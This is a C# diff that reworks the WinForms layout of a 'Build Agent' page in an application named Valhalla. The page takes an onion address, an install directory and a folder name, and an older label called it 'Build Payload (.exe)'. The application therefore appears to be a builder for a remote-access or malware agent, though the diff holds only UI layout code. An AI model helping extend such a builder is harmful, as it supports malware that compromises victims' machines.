@@ -128,10 +128,16 @@ namespace Valhalla
         private RelaySettings relaySettings;
         private volatile bool relayConnecting;
 
-        // Builder install-directory toggle group (Change 2).
+        // Builder install-directory toggle group.
         // _installDirButtons[i] corresponds to InstallDirectory enum value i.
         private System.Windows.Forms.Button[] _installDirButtons;
         private System.Windows.Forms.TextBox _folderNameBox;
+        private System.Windows.Forms.TableLayoutPanel _buildPageLayout;
+        private System.Windows.Forms.TableLayoutPanel _buildContentLayout;
+        private System.Windows.Forms.TableLayoutPanel _buildInstallLayout;
+        private System.Windows.Forms.FlowLayoutPanel _buildInstallButtonRow;
+        private System.Windows.Forms.Label _buildInstallDirLabel;
+        private System.Windows.Forms.Label _buildFolderLabel;
         private int _selectedInstallDir = 1; // default: AppData\Local
         private DevExpress.XtraEditors.TextEdit relayAddressEditor;
         private DevExpress.XtraEditors.TextEdit relayPortEditor;
@@ -3634,121 +3640,243 @@ namespace Valhalla
         {
             OpenFileDialogIcon = string.Empty;
 
-            // Rename the builder page header label from legacy "Build Payload (.exe)" to current purpose.
+            // The old designer layout was a stack of fixed-height Dock=Top controls.
+            // That becomes fragile as soon as the form is DPI-scaled or the working
+            // area is shorter than the designer's 932 px form.  Build the page around
+            // one deterministic table: header, responsive configuration card, a fixed
+            // terminal header, and a terminal that fills the remaining space.
             label52.Text = "Build Agent";
-
-            // Rename the sidebar navigation item to reflect current purpose.
             accordionControlElement6.Text = "Build";
 
-            // Hide the legacy "Convert To (.dll)" sidebar entry and its tab page.
             accordionControlElement7.Visible = false;
-            xtraTabPage6.PageVisible        = false;
-
-            // Remove the About category and About Us page from the sidebar and tab strip.
+            xtraTabPage6.PageVisible = false;
             accordionControlElement12.Visible = false;
             accordionControlElement13.Visible = false;
-            xtraTabPage9.PageVisible          = false;
+            xtraTabPage9.PageVisible = false;
 
-            // ── Strip the dead space from panelControl19 ────────────────────
-            // The designer placed 5 legacy controls (checkEdit1-4, textEdit5) with
-            // DockStyle.Top — they consume ~100px even when invisible.  Remove them
-            // from the dock chain entirely so they produce no layout space.
-            foreach (var c in new System.Windows.Forms.Control[]
-                { checkEdit1, checkEdit2, checkEdit3, checkEdit4, textEdit5, label53, textEdit3 })
-            {
-                c.Dock    = DockStyle.None;
-                c.Visible = false;
-                c.Size    = Size.Empty;
-            }
-
-            // Also undock label54 / textEdit4 / simpleButton6 so we can
-            // position everything ourselves without competing dock stacks.
-            label54.Dock     = DockStyle.None;
-            textEdit4.Dock   = DockStyle.None;
-            simpleButton6.Dock = DockStyle.None;
-
-            // ── Restore persisted values ────────────────────────────────────
             if (relaySettings != null)
             {
                 _selectedInstallDir = relaySettings.InstallDirectory;
-                if (_selectedInstallDir < 0 || _selectedInstallDir > 4) _selectedInstallDir = 1;
+                if (_selectedInstallDir < 0 || _selectedInstallDir > 4)
+                    _selectedInstallDir = 1;
             }
 
-            // ── Build the content panel that replaces panelControl19's interior ─
-            // Layout (top → bottom, left-indented by pictureEdit13 = 50px):
-            //   16px  "Onion Address" label
-            //   26px  textEdit4 (onion address field)
-            //   18px  gap
-            //   16px  "Install Directory" label   |  "Folder Name" label
-            //   30px  toggle buttons row          |  folder textbox
-            //   18px  gap
-            //   32px  BUILD button
-            // Total ≈ 156px  →  panelControl19 shrunk to 160px (+ 2px border padding each side)
+            // Remove legacy controls that were responsible for the old dock chain.
+            // Dispose them after detaching so the hidden controls cannot keep consuming
+            // layout space or remain rooted by the panel after this method returns.
+            foreach (Control c in new Control[]
+                { checkEdit1, checkEdit2, checkEdit3, checkEdit4, textEdit5, label53, textEdit3 })
+            {
+                if (c == null) continue;
+                if (panelControl19.Controls.Contains(c))
+                    panelControl19.Controls.Remove(c);
+                c.Dispose();
+            }
 
-            const int rightPad = 4; // right-side margin inside the host panel
-            const int rowH     = 26;
-            const int btnH     = 32;
-            const int labelH   = 16;
-            const int gap      = 12;
+            // Keep the existing icon, editor and build button so existing event wiring
+            // and build logic remain unchanged.  They will now live in the new table.
+            if (panelControl19.Controls.Contains(pictureEdit13))
+                panelControl19.Controls.Remove(pictureEdit13);
+            if (panelControl19.Controls.Contains(label54))
+                panelControl19.Controls.Remove(label54);
+            if (panelControl19.Controls.Contains(textEdit4))
+                panelControl19.Controls.Remove(textEdit4);
+            if (panelControl19.Controls.Contains(simpleButton6))
+                panelControl19.Controls.Remove(simpleButton6);
 
-            // Configure existing onion address label + field
-            label54.Text      = "Onion Address";
-            label54.AutoSize  = true;
-            label54.Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point);
+            panelControl19.Dock = DockStyle.Top;
+            panelControl20.Dock = DockStyle.Top;
+            panelControl21.Dock = DockStyle.Fill;
+
+            // The terminal is intentionally the only Fill-docked section.  The previous
+            // hard-coded 597 px height caused clipping on shorter screens and left dead
+            // space on taller screens.
+            panelControl21.MinimumSize = new Size(0, 0);
+
+            ConfigureBuildHeader();
+
+            int dpi = GetCurrentDpi();
+            _buildPageLayout = new TableLayoutPanel
+            {
+                Name = "buildPageLayout",
+                Dock = DockStyle.Fill,
+                BackColor = Color.Transparent,
+                Margin = Padding.Empty,
+                Padding = Padding.Empty,
+                ColumnCount = 2,
+                RowCount = 1,
+            };
+            _buildPageLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, ScaleLogicalPixels(50, dpi)));
+            _buildPageLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100F));
+
+            panelControl19.Controls.Clear();
+            panelControl19.Controls.Add(_buildPageLayout);
+
+            // Left rail: keep the existing vector image isolated in one table cell.
+            // DockStyle.Fill inside a TableLayoutPanel avoids the old PanelControl
+            // Left/Fill docking race that allowed content to paint over the icon.
+            pictureEdit13.Dock = DockStyle.Fill;
+            pictureEdit13.Margin = Padding.Empty;
+            _buildPageLayout.Controls.Add(pictureEdit13, 0, 0);
+
+            _buildContentLayout = new TableLayoutPanel
+            {
+                Name = "buildContentLayout",
+                Dock = DockStyle.Fill,
+                BackColor = Color.Transparent,
+                Margin = Padding.Empty,
+                Padding = new Padding(
+                    ScaleLogicalPixels(6, dpi),
+                    ScaleLogicalPixels(10, dpi),
+                    ScaleLogicalPixels(8, dpi),
+                    ScaleLogicalPixels(10, dpi)),
+                ColumnCount = 1,
+                RowCount = 7,
+            };
+            _buildContentLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100F));
+            _buildContentLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(22, dpi)));
+            _buildContentLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(6, dpi)));
+            _buildContentLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(30, dpi)));
+            _buildContentLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(8, dpi)));
+            _buildContentLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(58, dpi)));
+            _buildContentLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(8, dpi)));
+            _buildContentLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(32, dpi)));
+
+            ConfigureBuildOnionAddressControls();
+            _buildContentLayout.Controls.Add(label54, 0, 0);
+            _buildContentLayout.Controls.Add(textEdit4, 0, 2);
+
+            _buildInstallLayout = BuildInstallDirectoryLayout(dpi);
+            _buildContentLayout.Controls.Add(_buildInstallLayout, 0, 4);
+
+            simpleButton6.Dock = DockStyle.Fill;
+            simpleButton6.Margin = Padding.Empty;
+            simpleButton6.Height = ScaleLogicalPixels(32, dpi);
+            _buildContentLayout.Controls.Add(simpleButton6, 0, 6);
+
+            _buildPageLayout.Controls.Add(_buildContentLayout, 1, 0);
+
+            // Keep the card just tall enough for the responsive controls.  It must be
+            // calculated in device pixels because this form uses Per-Monitor-V2 DPI.
+            panelControl19.MinimumSize = new Size(0, ScaleLogicalPixels(188, dpi));
+            panelControl19.Height = ScaleLogicalPixels(188, dpi);
+            panelControl19.PerformLayout();
+            _buildContentLayout.PerformLayout();
+
+            UpdateBuildPageDpiLayout(dpi);
+        }
+
+        private void ConfigureBuildHeader()
+        {
+            int dpi = GetCurrentDpi();
+            label52.AutoSize = true;
+            label52.Font = new Font("Tahoma", 9.75F, FontStyle.Bold, GraphicsUnit.Point);
+            label52.Location = new Point(ScaleLogicalPixels(69, dpi), ScaleLogicalPixels(44, dpi));
+            label52.ForeColor = Color.White;
+            label52.BackColor = Color.Transparent;
+
+            pictureEdit12.Dock = DockStyle.Left;
+            pictureEdit12.Width = ScaleLogicalPixels(50, dpi);
+        }
+
+        private void ConfigureBuildOnionAddressControls()
+        {
+            label54.Text = "Onion Address";
+            label54.AutoSize = false;
+            label54.Dock = DockStyle.Fill;
+            label54.Margin = Padding.Empty;
+            label54.TextAlign = ContentAlignment.MiddleLeft;
+            label54.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point);
             label54.ForeColor = Color.FromArgb(160, 160, 160);
             label54.BackColor = Color.Transparent;
 
+            textEdit4.Dock = DockStyle.Fill;
+            textEdit4.Margin = Padding.Empty;
             textEdit4.Properties.AllowFocused = true;
             textEdit4.EditValue = relaySettings != null && !string.IsNullOrWhiteSpace(relaySettings.OnionAddress)
                 ? relaySettings.OnionAddress
                 : string.Empty;
+        }
 
-            // Configure existing BUILD button
-            simpleButton6.Dock = DockStyle.None;
-            simpleButton6.Height = btnH;
-
-            // ── Install Directory label + toggles ───────────────────────────
-            var installDirLabel = new System.Windows.Forms.Label
+        private TableLayoutPanel BuildInstallDirectoryLayout(int dpi)
+        {
+            var installLayout = new TableLayoutPanel
             {
-                AutoSize  = true,
-                Text      = "Install Directory",
-                Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
+                Name = "buildInstallLayout",
+                Dock = DockStyle.Fill,
+                BackColor = Color.Transparent,
+                Margin = Padding.Empty,
+                Padding = Padding.Empty,
+                ColumnCount = 2,
+                RowCount = 1,
+            };
+            installLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100F));
+            installLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, ScaleLogicalPixels(210, dpi)));
+
+            var installColumn = new TableLayoutPanel
+            {
+                Name = "installDirectoryColumn",
+                Dock = DockStyle.Fill,
+                BackColor = Color.Transparent,
+                Margin = new Padding(0, 0, ScaleLogicalPixels(8, dpi), 0),
+                Padding = Padding.Empty,
+                ColumnCount = 1,
+                RowCount = 2,
+            };
+            installColumn.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(20, dpi)));
+            installColumn.RowStyles.Add(new RowStyle(SizeType.Percent, 100F));
+
+            _buildInstallDirLabel = new Label
+            {
+                AutoSize = false,
+                Dock = DockStyle.Fill,
+                Margin = Padding.Empty,
+                Text = "Install Directory",
+                TextAlign = ContentAlignment.MiddleLeft,
+                Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
                 ForeColor = Color.FromArgb(160, 160, 160),
                 BackColor = Color.Transparent,
             };
+            installColumn.Controls.Add(_buildInstallDirLabel, 0, 0);
 
             string[] dirNames = { @"AppData\Roaming", @"AppData\Local", "Temp", "Program Files", "ProgramData" };
-            _installDirButtons = new System.Windows.Forms.Button[dirNames.Length];
+            _installDirButtons = new Button[dirNames.Length];
 
-            var toggleRow = new System.Windows.Forms.FlowLayoutPanel
+            _buildInstallButtonRow = new FlowLayoutPanel
             {
-                AutoSize      = true,
-                FlowDirection = System.Windows.Forms.FlowDirection.LeftToRight,
-                WrapContents  = false,
-                BackColor     = Color.Transparent,
-                Margin        = Padding.Empty,
-                Padding       = Padding.Empty,
+                Name = "buildInstallButtonRow",
+                Dock = DockStyle.Fill,
+                FlowDirection = FlowDirection.LeftToRight,
+                WrapContents = true,
+                AutoScroll = false,
+                BackColor = Color.Transparent,
+                Margin = Padding.Empty,
+                Padding = Padding.Empty,
             };
 
+            int buttonWidth = ScaleLogicalPixels(108, dpi);
+            int buttonHeight = ScaleLogicalPixels(28, dpi);
+            int buttonGap = ScaleLogicalPixels(6, dpi);
             for (int i = 0; i < dirNames.Length; i++)
             {
                 int capturedIndex = i;
-                var btn = new System.Windows.Forms.Button
+                var btn = new Button
                 {
-                    Text      = dirNames[i],
-                    AutoSize  = false,
-                    Height    = 28,
-                    Width     = 108,
+                    Text = dirNames[i],
+                    AutoSize = false,
+                    Width = buttonWidth,
+                    Height = buttonHeight,
                     FlatStyle = FlatStyle.Flat,
-                    Cursor    = Cursors.Hand,
-                    Font      = new Font("Segoe UI Semibold", 8F, FontStyle.Bold, GraphicsUnit.Point),
-                    Margin    = new Padding(0, 0, 6, 0),
+                    Cursor = Cursors.Hand,
+                    Font = new Font("Segoe UI Semibold", 8F, FontStyle.Bold, GraphicsUnit.Point),
+                    Margin = new Padding(0, 0, buttonGap, 0),
                     UseVisualStyleBackColor = false,
+                    TabStop = false,
                 };
-                btn.FlatAppearance.BorderSize  = 1;
+                btn.FlatAppearance.BorderSize = 1;
                 btn.FlatAppearance.BorderColor = Color.FromArgb(68, 68, 68);
                 UpdateInstallDirButtonStyle(btn, i == _selectedInstallDir);
-                btn.Click += (s, e) =>
+                btn.Click += delegate
                 {
                     _selectedInstallDir = capturedIndex;
                     for (int j = 0; j < _installDirButtons.Length; j++)
@@ -3760,32 +3888,51 @@ namespace Valhalla
                     }
                 };
                 _installDirButtons[i] = btn;
-                toggleRow.Controls.Add(btn);
+                _buildInstallButtonRow.Controls.Add(btn);
             }
+            installColumn.Controls.Add(_buildInstallButtonRow, 0, 1);
+            installLayout.Controls.Add(installColumn, 0, 0);
 
-            // ── Folder Name label + textbox ──────────────────────────────────
-            var folderLabel = new System.Windows.Forms.Label
+            var folderColumn = new TableLayoutPanel
             {
-                AutoSize  = true,
-                Text      = "Folder Name",
-                Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
+                Name = "folderNameColumn",
+                Dock = DockStyle.Fill,
+                BackColor = Color.Transparent,
+                Margin = Padding.Empty,
+                Padding = Padding.Empty,
+                ColumnCount = 1,
+                RowCount = 2,
+            };
+            folderColumn.RowStyles.Add(new RowStyle(SizeType.Absolute, ScaleLogicalPixels(20, dpi)));
+            folderColumn.RowStyles.Add(new RowStyle(SizeType.Percent, 100F));
+
+            _buildFolderLabel = new Label
+            {
+                AutoSize = false,
+                Dock = DockStyle.Fill,
+                Margin = Padding.Empty,
+                Text = "Folder Name",
+                TextAlign = ContentAlignment.MiddleLeft,
+                Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
                 ForeColor = Color.FromArgb(160, 160, 160),
                 BackColor = Color.Transparent,
             };
+            folderColumn.Controls.Add(_buildFolderLabel, 0, 0);
 
-            _folderNameBox = new System.Windows.Forms.TextBox
+            _folderNameBox = new TextBox
             {
-                Width       = 200,
-                Height      = 28,
-                Text        = relaySettings != null && !string.IsNullOrWhiteSpace(relaySettings.FolderName)
-                                  ? relaySettings.FolderName
-                                  : "Valhalla",
-                Font        = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
-                ForeColor   = Color.White,
-                BackColor   = Color.FromArgb(58, 58, 58),
+                Dock = DockStyle.Fill,
+                Height = ScaleLogicalPixels(28, dpi),
+                Margin = Padding.Empty,
+                Text = relaySettings != null && !string.IsNullOrWhiteSpace(relaySettings.FolderName)
+                    ? relaySettings.FolderName
+                    : "Valhalla",
+                Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
+                ForeColor = Color.White,
+                BackColor = Color.FromArgb(58, 58, 58),
                 BorderStyle = BorderStyle.FixedSingle,
             };
-            _folderNameBox.TextChanged += (s, e) =>
+            _folderNameBox.TextChanged += delegate
             {
                 if (relaySettings != null)
                 {
@@ -3793,80 +3940,61 @@ namespace Valhalla
                     try { RelaySettingsStore.Save(relaySettings); } catch { }
                 }
             };
+            folderColumn.Controls.Add(_folderNameBox, 0, 1);
+            installLayout.Controls.Add(folderColumn, 1, 0);
 
-            // ── pictureEdit13 geometry ───────────────────────────────────────
-            // DevExpress PanelControl has a 2 px inner border, so its client
-            // origin is (2, 2).  pictureEdit13 is DockStyle.Left at width 50,
-            // occupying client x = 0..49.  All content must start at x = 52
-            // (50 px icon + 2 px gap) to avoid being hidden behind the icon.
-            // Using a DockStyle.Fill host panel does NOT work here — DevExpress
-            // PanelControl ignores the Left-docked sibling when positioning a
-            // Fill child, so the host overlaps pictureEdit13 and clips content.
-            const int iconRight = 52;
+            return installLayout;
+        }
 
-            // ── Place content controls directly on panelControl19 ────────────
-            int y = 10;
+        private void UpdateBuildPageDpiLayout(int dpi)
+        {
+            if (_buildPageLayout == null || _buildPageLayout.IsDisposed)
+                return;
 
-            label54.Location   = new Point(iconRight, y);
-            y += labelH + 4;
-            textEdit4.Location = new Point(iconRight, y);
-            textEdit4.Height   = rowH;
-            y += rowH + gap;
+            int leftRail = ScaleLogicalPixels(50, dpi);
+            _buildPageLayout.ColumnStyles[0].Width = leftRail;
+            _buildPageLayout.ColumnStyles[1].Width = 100F;
 
-            installDirLabel.Location = new Point(iconRight, y);
-            y += labelH + 4;
-
-            toggleRow.Location    = new Point(iconRight, y);
-            _folderNameBox.Height = 28;
-            y += 30 + gap;
-
-            simpleButton6.Location = new Point(iconRight, y);
-            int totalH = y + btnH + 10;
-
-            // Width-dependent layout — stretches fields to panel width and
-            // right-anchors the Folder Name label + box.
-            void ApplyLayout()
+            if (_buildContentLayout != null && !_buildContentLayout.IsDisposed)
             {
-                int availW = panelControl19.ClientSize.Width - iconRight - rightPad;
-                if (availW <= 0) return;
-
-                int folderBoxW = _folderNameBox.Width;  // fixed 200 px
-                int rightX     = iconRight + availW - folderBoxW;
-                if (rightX < iconRight) rightX = iconRight;
-
-                folderLabel.SetBounds(rightX, installDirLabel.Top, 0, 0, BoundsSpecified.Location);
-                _folderNameBox.SetBounds(rightX, toggleRow.Top,    0, 0, BoundsSpecified.Location);
-
-                textEdit4.Width      = availW;
-                simpleButton6.Width  = availW;
-                toggleRow.Width      = rightX - iconRight - 8;
+                _buildContentLayout.Padding = new Padding(
+                    ScaleLogicalPixels(6, dpi),
+                    ScaleLogicalPixels(10, dpi),
+                    ScaleLogicalPixels(8, dpi),
+                    ScaleLogicalPixels(10, dpi));
+                _buildContentLayout.RowStyles[0].Height = ScaleLogicalPixels(22, dpi);
+                _buildContentLayout.RowStyles[1].Height = ScaleLogicalPixels(6, dpi);
+                _buildContentLayout.RowStyles[2].Height = ScaleLogicalPixels(30, dpi);
+                _buildContentLayout.RowStyles[3].Height = ScaleLogicalPixels(8, dpi);
+                _buildContentLayout.RowStyles[4].Height = ScaleLogicalPixels(58, dpi);
+                _buildContentLayout.RowStyles[5].Height = ScaleLogicalPixels(8, dpi);
+                _buildContentLayout.RowStyles[6].Height = ScaleLogicalPixels(32, dpi);
             }
 
-            // Remove all legacy children from panelControl19, keep pictureEdit13.
-            var keepControls = new System.Windows.Forms.Control[] { pictureEdit13 };
-            for (int i = panelControl19.Controls.Count - 1; i >= 0; i--)
+            if (_buildInstallLayout != null && _buildInstallLayout.ColumnStyles.Count == 2)
+                _buildInstallLayout.ColumnStyles[1].Width = ScaleLogicalPixels(210, dpi);
+
+            if (_installDirButtons != null)
             {
-                if (Array.IndexOf(keepControls, panelControl19.Controls[i]) < 0)
-                    panelControl19.Controls.RemoveAt(i);
+                int width = ScaleLogicalPixels(108, dpi);
+                int height = ScaleLogicalPixels(28, dpi);
+                int gap = ScaleLogicalPixels(6, dpi);
+                foreach (Button btn in _installDirButtons)
+                {
+                    if (btn == null || btn.IsDisposed) continue;
+                    btn.Size = new Size(width, height);
+                    btn.Margin = new Padding(0, 0, gap, 0);
+                }
             }
 
-            // Add content controls directly to panelControl19.
-            panelControl19.Controls.Add(label54);
-            panelControl19.Controls.Add(textEdit4);
-            panelControl19.Controls.Add(installDirLabel);
-            panelControl19.Controls.Add(folderLabel);
-            panelControl19.Controls.Add(toggleRow);
-            panelControl19.Controls.Add(_folderNameBox);
-            panelControl19.Controls.Add(simpleButton6);
-
-            // Shrink panelControl19 to only the height we need.
-            panelControl19.Height = totalH + 4;
-
-            // Apply widths immediately (ClientSize is valid here since the
-            // designer set panelControl19.Size before ConfigureAgentBuildUi runs)
-            // and again whenever the window is resized.
-            ApplyLayout();
-            panelControl19.Resize += (s, e) => ApplyLayout();
+            // Match the visual density of the editor card to the active monitor.
+            pictureEdit12.Width = leftRail;
+            label52.Location = new Point(ScaleLogicalPixels(69, dpi), ScaleLogicalPixels(44, dpi));
+            label54.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point);
+            simpleButton6.Height = ScaleLogicalPixels(32, dpi);
+            panelControl19.MinimumSize = new Size(0, ScaleLogicalPixels(188, dpi));
+            panelControl19.Height = ScaleLogicalPixels(188, dpi);
+            pictureEdit13.Width = leftRail;
         }
 
         private static void UpdateInstallDirButtonStyle(System.Windows.Forms.Button btn, bool selected)
@@ -5386,6 +5514,7 @@ namespace Valhalla
             // Rebind the small vector navigation icons at the new DPI so their
             // configured SvgImageSize remains crisp instead of bitmap-scaled.
             ApplySidebarIcons();
+            UpdateBuildPageDpiLayout(e.DeviceDpiNew);
             Invalidate(true);
         }
 
